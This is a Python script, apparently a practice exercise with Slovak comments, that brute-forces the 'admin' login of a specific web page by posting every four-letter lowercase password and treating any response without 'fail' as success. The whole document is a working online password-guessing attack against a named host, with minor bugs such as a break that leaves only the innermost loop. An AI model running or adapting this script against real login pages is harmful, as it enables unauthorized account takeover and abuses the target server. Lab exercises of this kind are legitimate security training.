from string import ascii_lowercase
import requests

name = "admin"
password = ['', '', '', '']
# heslo: 4 pismena mini abeceda
r = requests.post("https://dudo.gvpt.sk/bruteforce/account/login", data={name: ''.join(password)})
check = r.text
correct = []
count = 0
for i in ascii_lowercase:
    password[0] = i
    for j in ascii_lowercase:
        password[1] = j
        for x in ascii_lowercase:
            password[2] = x
            for y in ascii_lowercase:
                password[3] = y
                data = {'username': name, 'password': ''.join(password), "action": "submit"}
                temp = requests.post("https://dudo.gvpt.sk/bruteforce/account/login", data=data)
                if b"fail" in temp.content:
                    print("pokus:", ''.join(password))
                else:
                    print(''.join(password))
                    correct.append(''.join(password))
                    break  # exit all loops when password is found
                count += 1
                print(count)
print("Finished")
print(correct)
#pass xamp
